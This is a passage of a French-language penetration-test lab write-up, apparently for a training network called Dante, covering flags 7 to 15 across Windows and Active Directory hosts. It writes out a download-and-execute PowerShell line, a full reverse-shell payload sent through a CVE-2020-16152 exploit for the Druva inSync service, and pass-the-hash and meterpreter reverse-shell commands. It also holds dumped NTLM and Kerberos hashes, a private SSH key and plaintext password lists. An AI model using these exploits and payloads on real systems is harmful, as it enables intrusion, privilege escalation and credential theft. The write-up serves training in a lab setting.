
### [Flag7 : DANTE{l355_t4lk_m04r_l15tening}]

## Privesc

Sur cette machine Defender est activer ce qui veux dire qu'il peut potentiellement flager tout les binaire que nous tenterons d'importer alors je vais essayer d'importer `winpeas.ps1` qui va s'executer en memoire

```js
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.85/winPEAS.ps1')"
```

Avec la commande 
```js
tasklist /svc
```

J'ai trouver un process assez interressante  `inSyncCPHwnet64.exe`

![](/assets/IMG-20260714172132703.png)

En creusant avec quelque recherche j'ai pu appercevoir un CVE sur ce service
![](/assets/IMG-20260714172132747.png)

![](/assets/IMG-20260714172132782.png)

Ce service qui tourne en localsystem sur le port 6064 est vuln a un CVE `CVE-2020-16152`

## Exploitation

Creation d'un Payload Custum
```js
$ErrorActionPreference = "Stop"
$cmd = 'powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$c=New-Object System.Net.Sockets.TCPClient(''10.10.14.85'',8888);$s=$c.GetStream();[byte[]]$b=0..1023|%{0};while(($i=$s.Read($b,0,$b.Length))-ne0){;$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String);$sb2=$sb+''PS ''+(pwd).Path+''> '';$sb2b=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sb2b,0,$sb2b.Length);$s.Flush()};$c.Close()"'
$s = New-Object System.Net.Sockets.Socket(
    [System.Net.Sockets.AddressFamily]::InterNetwork,
    [System.Net.Sockets.SocketType]::Stream,
    [System.Net.Sockets.ProtocolType]::Tcp
)
$s.Connect("127.0.0.1", 6064)
$header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
$rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
$command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd");
$length = [System.BitConverter]::GetBytes($command.Length);
$s.Send($header)
$s.Send($rpcType)
$s.Send($length)
$s.Send($command)
```

![](/assets/IMG-20260714172132817.png)

![](/assets/IMG-20260714172132860.png)

![](/assets/IMG-20260714172132899.png)

### [Flag8 : DANTE{Bad_pr4ct1ces_Thru_strncmp}]

```js
10.10.110.100 DANTE-WEB-NIX01    [pwned!]
172.16.1.5    DANTE-SQL01        
172.16.1.10   DANTE-NIX02        [pwned!]
172.16.1.12   DANTE-NIX07        
172.16.1.13   DANTE-WS01         [pwned!]
172.16.1.17   DANTE-NIX03        [pwned!]
172.16.1.19   DANTE-JENKINS      
172.16.1.20   DANTE-DC01         
172.16.1.100  DANTE-WEB-NIX01    [Pwned!]
172.16.1.101  DANTE-WS02         
172.16.1.102  DANTE-WS03         
172.16.2.5    DANTE-DC02         
172.16.2.101  DANTE-ADMIN-NIX05  
172.16.2.6    DANTE-ADMIN-NIX06  
```

---

# 172.16.1.20 : DC01  
## Enumerations des ports et services

```js
nmap -sV -sC 172.16.1.20 -Pn
```

```js
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-11 08:27 +0000
Nmap scan report for 172.16.1.20
Host is up (3.7s latency).
Not shown: 977 closed tcp ports (reset)
Bug in http-title: no string output.
PORT      STATE SERVICE       VERSION
22/tcp    open  ssh           OpenSSH for_Windows_8.1 (protocol 2.0)
| ssh-hostkey: 
|   3072 15:19:e6:66:c3:4f:f7:80:7e:48:f7:b9:9a:f9:ee:08 (RSA)
|   256 f3:ea:12:b5:fa:b0:0c:14:fb:65:98:0f:09:92:5c:56 (ECDSA)
|_  256 42:ca:16:67:5a:e7:a2:01:b0:63:4b:f7:ed:55:db:90 (ED25519)
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 8.5
| http-methods: 
|_  Potentially risky methods: TRACE
| http-robots.txt: 1 disallowed entry 
|_/ 
|_http-server-header: Microsoft-IIS/8.5
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-07-11 08:27:42Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: DANTE.local, Site: Default-First-Site-Name)
443/tcp   open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_ssl-date: 2026-07-11T08:31:29+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=DANTE-DC01
| Subject Alternative Name: othername: UPN:S-1-5-21-2273245918-2602599687-2649756301-1003
| Not valid before: 2020-08-07T09:32:48
|_Not valid after:  2025-08-06T09:32:48
445/tcp   open  microsoft-ds  Windows Server 2012 R2 Standard 9600 microsoft-ds (workgroup: DANTE)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: DANTE.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=DANTE-DC01.DANTE.local
| Not valid before: 2026-07-09T09:12:03
|_Not valid after:  2027-01-08T09:12:03
| rdp-ntlm-info: 
|   Target_Name: DANTE
|   NetBIOS_Domain_Name: DANTE
|   NetBIOS_Computer_Name: DANTE-DC01
|   DNS_Domain_Name: DANTE.local
|   DNS_Computer_Name: DANTE-DC01.DANTE.local
|   DNS_Tree_Name: DANTE.local
|   Product_Version: 6.3.9600
|_  System_Time: 2026-07-11T08:28:49+00:00
|_ssl-date: 2026-07-11T08:31:29+00:00; 0s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49159/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DANTE-DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-time: 
|   date: 2026-07-11T08:28:50
|_  start_date: 2026-07-10T09:11:17
| smb2-security-mode: 
|   3.0.2: 
|_    Message signing enabled and required
|_clock-skew: mean: -10m01s, deviation: 24m29s, median: -1s
| smb-os-discovery: 
|   OS: Windows Server 2012 R2 Standard 9600 (Windows Server 2012 R2 Standard 6.3)
|   OS CPE: cpe:/o:microsoft:windows_server_2012::-
|   Computer name: DANTE-DC01
|   NetBIOS computer name: DANTE-DC01\x00
|   Domain name: DANTE.local
|   Forest name: DANTE.local
|   FQDN: DANTE-DC01.DANTE.local
|_  System time: 2026-07-11T09:28:44+01:00
|_nbstat: NetBIOS name: DANTE-DC01, NetBIOS user: <unknown>, NetBIOS MAC: a2:de:ad:6b:5a:ad (unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 267.29 seconds
```

## SMB Enumeration

![](/assets/IMG-20260714172132932.png)

Connexion smb anonyme activer, mais connexion impossible
![](/assets/IMG-20260714172132970.png)

En fesant une enumeration plus avancer avec metasploit j'ai decouvert que cette machine est vuln a `ETHERNAL BLUE`

![](/assets/IMG-20260714172133015.png)

## Exploitation

![](/assets/IMG-20260714172133060.png)

### Dump des hash des creds des differents users du domain controler

```js
Administrator:500:aad3b435b51404eeaad3b435b51404ee:9bff06fe611486579fb74037890fda96:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:49e6f37ede481d09747f6a0c9abcbaa7:::
SelfHealUser:1001:aad3b435b51404eeaad3b435b51404ee:236a174dfe9cf1f702ae493d934fb70e:::
katwamba:1002:aad3b435b51404eeaad3b435b51404ee:14a71f9e65448d83e8c63d46355837c3:::
mrb3n:2104:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
xadmin:7104:aad3b435b51404eeaad3b435b51404ee:649f65073a6672a9898cb4eb61f9684a:::
DANTE-DC01$:1003:aad3b435b51404eeaad3b435b51404ee:0d8d2841f3243297d698ad449342d93d:::
MediaAdmin$:1117:aad3b435b51404eeaad3b435b51404ee:b9292845e10d845f4ba669d8e2988078:::

```

![](/assets/IMG-20260714172133101.png)

### KATWAMBA RSA Key

```js
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

![](/assets/IMG-20260714172133141.png)

### [Flag9: DANTE{1_jusT_c@nt_st0p_d0ing_th1s}]

```js
mrb3n:S3kur1ty2020!
```

### [Flag10 : DANTE{Feel1ng_Blu3_or_Zer0_f33lings?}]

### Telechargement d'un ficher assez interessant trouver

![](/assets/IMG-20260714172133187.png)


```js
libreoffice employee_backup.xlsx
# ou pour extraire le texte brut rapidement :
python3 -c "
from openpyxl import load_workbook
wb = load_workbook('employee_backup.xlsx', data_only=True)
for sheet in wb.sheetnames:
    ws = wb[sheet]
    print(f'--- {sheet} ---')
    for row in ws.iter_rows(values_only=True):
        print(row)
"
```

Avec ce script j'ai pu extraire tout le contenu brute de ce dernier

```js
--- Old Employees  ---
('asmith', 'Princess1')
('smoggat', 'Summer2019')
('tmodle', 'P45678!')
('ccraven', 'Password1')
('kploty', 'Teacher65')
('jbercov', '4567Holiday1')
('whaguey', 'acb123')
('dcamtan', 'WorldOfWarcraft67')
('tspadly', 'RopeBlackfieldForwardslash')
('ematlis', 'JuneJuly1TY')
('fglacdon', 'FinalFantasy7')
('tmentrso', '65RedBalloons')
('dharding', 'WestminsterOrange5')
('smillar', 'MarksAndSparks91')
('bjohnston', 'Bullingdon1')
('iahmed', 'Sheffield23')
('plongbottom', 'PowerfixSaturdayClub777')
('jcarrot', 'Tanenbaum0001')
('lgesley', 'SuperStrongCantForget123456789')
--- New Employees - update asap ---
--- Sheet3 ---
--- Sheet4 ---
```


## Utilisateur trouver
```js
asmith
smoggat
tmodle
ccraven
kploty
jbercov
whaguey
dcamtan
tspadly
ematlis
fglacdon
tmentrso
dharding
smillar
bjohnston
iahmed
plongbottom
jcarrot
lgesley
```

## Password trouver
```js
Princess1
Summer2019
P45678!
Password1
Teacher65
4567Holiday1
acb123
WorldOfWarcraft67
RopeBlackfieldForwardslash
JuneJuly1TY
FinalFantasy7
65RedBalloons
WestminsterOrange5
MarksAndSparks91
Bullingdon1
Sheffield23
PowerfixSaturdayClub777
Tanenbaum0001
SuperStrongCantForget123456789
```

```js
10.10.110.100 DANTE-WEB-NIX01    [pwned!]
172.16.1.5    DANTE-SQL01        
172.16.1.10   DANTE-NIX02        [pwned!]
172.16.1.12   DANTE-NIX07        
172.16.1.13   DANTE-WS01         [pwned!]
172.16.1.17   DANTE-NIX03        [pwned!]
172.16.1.19   DANTE-JENKINS      
172.16.1.20   DANTE-DC01         [pwned!]
172.16.1.100  DANTE-WEB-NIX01    [Pwned!]
172.16.1.101  DANTE-WS02         
172.16.1.102  DANTE-WS03         
172.16.2.5    DANTE-DC02         
172.16.2.101  DANTE-ADMIN-NIX05  
172.16.2.6    DANTE-ADMIN-NIX06  
```

---
# Enumerer tout les ip d'un sous reseau sur Windows

```js
1..254 | ForEach-Object { $ip = "172.16.2.$_"; if (Test-Connection -ComputerName $ip -Count 1 -Quiet) { [PSCustomObject]@{ IPAddress = $ip; Status = "En ligne" } } }
```

mais ici dans notre cas `arp -a` serait suffisant

```js
Interface: 172.16.2.5 --- 0x10
  Internet Address      Physical Address      Type
  172.16.2.1            a2-de-ad-21-49-d8     dynamic
  172.16.2.6            a2-de-ad-de-31-f7     dynamic
  172.16.2.101          a2-de-ad-5c-93-9f     dynamic
  172.16.2.255          ff-ff-ff-ff-ff-ff     static
  224.0.0.22            01-00-5e-00-00-16     static
  224.0.0.251           01-00-5e-00-00-fb     static
  224.0.0.252           01-00-5e-00-00-fc     static
```

## Ip Trouvee

```js
172.16.2.1
172.16.2.6
```
---
# 172.16.2.5: DANTE-DC02

## Redirection de port : Ligolo

![](/assets/IMG-20260714172133240.png)

```js
listener_add --addr {DMZ_ip}:11602 --to 0.0.0.0:11601
```

```js
session
```

```js
ifcreate --name {NAME}
```

```js
route_add --name {DC_01} --route {2eme sous reseau}/24
```

```js
tunnel_start --tun {name}
```

## Enumeration des ports et services

```js
nmap -sV -sC 172.16.2.5 -Pn
```

```js
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-13 12:46 +0000
Nmap scan report for 172.16.2.5
Host is up (0.83s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-07-13 12:48:10Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: DANTE.ADMIN, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: DANTE.ADMIN, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: DANTE-DC02; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-07-13T12:48:38
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 181.50 seconds
```

## Domain name

```js
DANTE.ADMIN
```

## Enumeration des Users avec Kerbrute (Asreprosting)

```js
kerbrute userenum -d DANTE.ADMIN --dc 172.16.2.5 all_user.txt
```

```js

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 07/13/26 - Ronnie Flathers @ropnop

2026/07/13 12:55:01 >  Using KDC(s):
2026/07/13 12:55:01 >  	172.16.2.5:88

2026/07/13 12:55:02 >  [+] VALID USERNAME:	 Administrator@DANTE.ADMIN
2026/07/13 12:55:04 >  [+] jbercov has no pre auth required. Dumping hash to crack offline:
$krb5asrep$18$jbercov@DANTE.ADMIN:a7891718752fe411c8a896ee051067da$ffc626d5ce29e1a194d90f298e880e1ad194ca2adbd4f56f022fc8cd1f671e09d838cb6b52f9fa9aaa6247d7b8c3c37f04c36fc01bbd993b0d0815252d85739dbf25440a7446987d79e3b3cd4b2d26672303fd31cc0e797d7fb8a728f1d91aced1031ffe0ca63576efa73dec7afdcdd8c065fd6900b5e0ad1182b01b4e5f0c05aaabea382a954ea47ca38ffd6a2927a11bf3662273a419cdd780c2194d51ea0d65398bf1e5b35514ce06e980f6e2ddbd47c0698ce064acf29ba42d4ced410c9bbfef54b7521aed3de5009dedab1d8dcaa931123fea1244a6d46317e1b49c59151b313ba5c0a0f93f4dccdb666eb6b2e489ffdbcf1fe2787fcf8759540c99
2026/07/13 12:55:04 >  [+] VALID USERNAME:	 jbercov@DANTE.ADMIN
2026/07/13 12:55:06 >  Done! Tested 37 usernames (2 valid) in 4.742 seconds
```

### Trouvaille
```js
user : jbercov
user_hash : a7891718752fe411c8a896ee051067da$ffc626d5ce29e1a194d90f298e880e1ad194ca2adbd4f56f022fc8cd1f671e09d838cb6b52f9fa9aaa6247d7b8c3c37f04c36fc01bbd993b0d0815252d85739dbf25440a7446987d79e3b3cd4b2d26672303fd31cc0e797d7fb8a728f1d91aced1031ffe0ca63576efa73dec7afdcdd8c065fd6900b5e0ad1182b01b4e5f0c05aaabea382a954ea47ca38ffd6a2927a11bf3662273a419cdd780c2194d51ea0d65398bf1e5b35514ce06e980f6e2ddbd47c0698ce064acf29ba42d4ced410c9bbfef54b7521aed3de5009dedab1d8dcaa931123fea1244a6d46317e1b49c59151b313ba5c0a0f93f4dccdb666eb6b2e489ffdbcf1fe2787fcf8759540c99
```

## Cracker le mot de passe 

## Recuperation du bon format du hash
```js
impacket-GetNPUsers  DANTE.ADMIN/ -usersfile all_user.txt -no-pass -dc-ip 172.16.2.5 -format hashcat -outputfile asrep_hashes.txt
```

```js
$krb5asrep$23$jbercov@DANTE.ADMIN:3e53937647230de313caca2bdf5acd2f$5292dc63bcc4ef2779c8e10b1d8c3a2361033e445e3711506d93a7e842553f410a798ecd6ffeec7dd842d2679a41d265e250616ea97eaf9600fa85e0872897485720800288d1a92238b5f3be0468a15c91ce72b06b63f125abb90ca0100f90ccde9e0ad13d97c518b00966fc069a916631952bf228ee21233deb5919e710840ccb65f8079f78f32ff9e24cbd62315ecc50899f350839d11357d95e8002b6771b81cf179c9012847a15262670e863343e167e7b126596460502019374b9ec282716f7f0758cf6c7b90831a810473fac9eece3fbcfed7806726db3834d91fa0d1bef6470cd8781ad2b95ba
```


```js
user: jbercov| pass: myspace7
```


## Connexion a l'hote

![](/assets/IMG-20260714172133275.png)

### [Flag11: DANTE{Im_too_hot_Im_K3rb3r045TinG!}]

## Utilisation de Bloodhound pour enumerer les objets, ACL et trouver une liaisons entre les relations

#### Collecte d'information

```js
bloodhound-python -u 'jbercov' -p 'myspace7' -ns 172.16.2.5 --dns-tcp -d DANTE.ADMIN -c all --zip
```

![](/assets/IMG-20260714172133319.png)

![](/assets/IMG-20260714172133362.png)

![](/assets/IMG-20260714172133404.png)


## Dumper le contenu du NTDS.DIT

```js
impacket-secretsdump 'DANTE.ADMIN'/'jbercov':'myspace7'@'DANTE.ADMIN'
```

```js
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:4c827b7074e99eefd49d05872185f7f8:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:2e5f00bc433acee0ae72f622450bd63c:::
DANTE.ADMIN\jbercov:1106:aad3b435b51404eeaad3b435b51404ee:2747def689b576780fe2339fd596688c:::
DANTE-DC02$:1000:aad3b435b51404eeaad3b435b51404ee:ef59f51db6a7d4bf00cd1a93d11fab7c:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:0652a9eb0b8463a8ca287fc5d099076fbbd5f1d4bc0b94466ccbcc5c4a186095
Administrator:aes128-cts-hmac-sha1-96:08f140624c46af979044dde5fff44cfd
Administrator:des-cbc-md5:8ac752cea84f4a10
krbtgt:aes256-cts-hmac-sha1-96:a696318416d7e5d58b1b5763f1a9b7f2aa23ca743ac3b16990e5069426d4bc46
krbtgt:aes128-cts-hmac-sha1-96:783ecc93806090e2b21d88160905dc36
krbtgt:des-cbc-md5:dcbff8a80b5b343e
DANTE.ADMIN\jbercov:aes256-cts-hmac-sha1-96:5b4b2e67112ac898f13fc8b686c07a43655c5b88c9ba7e5b48b1383bc5b3a3b6
DANTE.ADMIN\jbercov:aes128-cts-hmac-sha1-96:489ca03ed99b1cb73e7a28c242328d0d
DANTE.ADMIN\jbercov:des-cbc-md5:c7e08938cb7f929d
DANTE-DC02$:aes256-cts-hmac-sha1-96:8b448b761c659393764ee3ae8491e046552404ae2fbe49b4f83d683c37cb7a59
DANTE-DC02$:aes128-cts-hmac-sha1-96:e158310294ce7b1fb9fbf23a6c841990
DANTE-DC02$:des-cbc-md5:a18a34d357022915
```

## Admin hashntlm

```js
4c827b7074e99eefd49d05872185f7f8
```

## Connection en Admin

```js
evil-winrm -u Administrator -i 172.16.2.5 -H 4c827b7074e99eefd49d05872185f7f8
```

![](/assets/IMG-20260714172133441.png)

## Trouvaille : Jenkins Creds

```js
user : Admin_129834765 | pass: SamsungOctober102030
```

### [Flag12 : DANTE{DC_or_Marvel?}]

```js
10.10.110.100 DANTE-WEB-NIX01    [pwned!]
172.16.1.5    DANTE-SQL01        
172.16.1.10   DANTE-NIX02        [pwned!]
172.16.1.12   DANTE-NIX07        
172.16.1.13   DANTE-WS01         [pwned!]
172.16.1.17   DANTE-NIX03        [pwned!]
172.16.1.19   DANTE-JENKINS      
172.16.1.20   DANTE-DC01         [pwned!]
172.16.1.100  DANTE-WEB-NIX01    [Pwned!]
172.16.1.101  DANTE-WS02         
172.16.1.102  DANTE-WS03         
172.16.2.5    DANTE-DC02         [pwned!]
172.16.2.101  DANTE-ADMIN-NIX05  
172.16.2.6    DANTE-ADMIN-NIX06  
```

---
# 172.16.2.101 : DANTE-ADMIN-NIX05

## Enumeration des Ports et Services

```js
nmap -sV -sC 172.16.2.101 -Pn
```

Le scan avec `nmap` ne passe pas alors j'ai du le faire sur le `DC` 
```js
$ports = @(21,22,80,88,135,139,389,443,445,464,593,636,3268,3269,3389,5985,8080)
foreach ($port in $ports) {
    $test = New-Object System.Net.Sockets.TcpClient
    try { 
        $test.Connect("172.16.2.101", $port)
        if ($test.Connected) { Write-Output "172.16.2.101 - Port ouvert : $port" }
        $test.Close() 
    } catch {}
}
```

```js
172.16.2.101 - Port ouvert : 22
```

Bon apres avoir fait des recherches, j'ai penser a connecter le `DC` avec msfconsole et de la je pourrai tout faire sans restriction

```js
use exploit/windows/smb/psexec
set RHOSTS 172.16.2.5
set SMBUser Administrator
set SMBPass aad3b435b51404eeaad3b435b51404ee:4c827b7074e99eefd49d05872185f7f8
set SMBPass_TYPE hash
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.14.53
run
```

Apres etre connecter avec meterpreter

```js
run autoroute -s 172.16.2.0/24
route add 172.16.2.0/24 1
run autoroute -p
background
```

Ensuite Scan de part
```js
use auxiliary/scanner/portscan/tcp
set RHOSTS 172.16.2.101
set PORTS 21,22,80,135,139,443,445,3389,5985,8080
run
```

Connection via `ssh_bruteforcing`

```js
set RHOSTS 172.16.2.101
set USER_FILE /home/amogus/Téléchargements/DANTE/all_user.txt
set PASS_FILE /home/amogus/Téléchargements/DANTE/all_pass.txt
set STOP_ON_SUCCESS true
run
```

ou via Ligolo


## Brute force avec tout les precedent creds trouver

![](/assets/IMG-20260714172133484.png)

```js
julian:manchesterunited
```

## Privesc

![](/assets/IMG-20260714172133530.png)
### Elevation de privilege avec la vuln pkexec

### [Flag13 : DANTE{H1ding_1n_th3_c0rner}]

### [Flag14 : DANTE{0verfl0wing_l1k3_craz33!}]

```js
10.10.110.100 DANTE-WEB-NIX01    [pwned!]
172.16.1.5    DANTE-SQL01        
172.16.1.10   DANTE-NIX02        [pwned!]
172.16.1.12   DANTE-NIX07        
172.16.1.13   DANTE-WS01         [pwned!]
172.16.1.17   DANTE-NIX03        [pwned!]
172.16.1.19   DANTE-JENKINS      
172.16.1.20   DANTE-DC01         [pwned!]
172.16.1.100  DANTE-WEB-NIX01    [Pwned!]
172.16.1.101  DANTE-WS02         
172.16.1.102  DANTE-WS03         
172.16.2.5    DANTE-DC02         [pwned!]
172.16.2.101  DANTE-ADMIN-NIX05  [pwned!]
172.16.2.6    DANTE-ADMIN-NIX06  
```
---
# 172.16.2.6 : DANTE-ADMIN-NIX06

## Enumeration des ports et services

```js
nmap -sV -sC 172.16.2.6 -Pn
```

Connexion impossible a l'hote nous allons passer par msfconsole


### [Flag15: DANTE{Alw4ys_check_th053_group5}]

---
## List de tout les users trouvers

```js
admin
aj
Administrator
asmith
balthazar
bjohnston
ccraven
dcamtan
DANTE-DC01$
dharding
ematlis
fglacdon
frank
Guest
iahmed
james
jbercov
jcarrot
katwamba
kevin
kploty
krbtgt
lgesley
margaret
MediaAdmin$
mrb3n
nathan
plongbottom
SelfHealUser
shaun
smillar
smoggat
tmentrso
tmodle
tspadly
whaguey
xadmin
ben
egre55
Admin_129834765
```

## Tout les passwords trouver

```js
Princess1
Summer2019
P45678!
Password1
Teacher65
4567Holiday1
acb123
WorldOfWarcraft67
RopeBlackfieldForwardslash
JuneJuly1TY
FinalFantasy7
65RedBalloons
WestminsterOrange5
MarksAndSparks91
Bullingdon1
Sheffield23
PowerfixSaturdayClub777
Tanenbaum0001
SuperStrongCantForget123456789
Toyota
password
TheJoker12345!
Welcome1!2@3#
TractorHeadtorchDeskmat
STARS5678FORTUNE401
Password6543
